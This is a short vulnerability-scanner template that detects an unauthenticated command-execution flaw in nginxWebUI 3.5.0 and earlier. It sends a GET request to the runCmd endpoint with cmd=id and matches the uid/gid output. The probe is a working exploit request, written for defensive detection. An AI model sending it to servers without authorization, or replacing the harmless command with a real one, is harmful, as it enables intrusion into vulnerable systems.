id: "nginxwebui-runcmd-rce"
name: "nginxWebUI ≤ 3.5.0 runCmd - Remote Command Execution"
severity: "critical"
description: "nginxWebUI’s runCmd feature and is caused by incomplete validation of user input. Attackers can exploit the vulnerability by crafting malicious data to execute arbitrary commands on a vulnerable server without authorization."
tech:
  - "nginx"
tags:
  - "nginx"
  - "nginxwebui"
  - "rce"
  - "vuln"
reference: "https://github.com/qingchenhh/qc_poc/blob/main/Goby/nginxWebUI_runCmd_rce.go"
spaExclusion: true
request:
  method: "GET"
  path: "/AdminPage/conf/runCmd?cmd=id"
control:
  method: "GET"
  path: "/.guardian-none-{{rand}}"
matchers-condition: "and"
matchers:
  - type: "regex"
    part: "body"
    regex:
      - "uid=\\d+\\(([^)]+)\\) gid=\\d+\\(([^)]+)\\)"
  - type: "word"
    part: "header"
    words:
      - "application/json"
  - type: "status"
    status:
      - 200
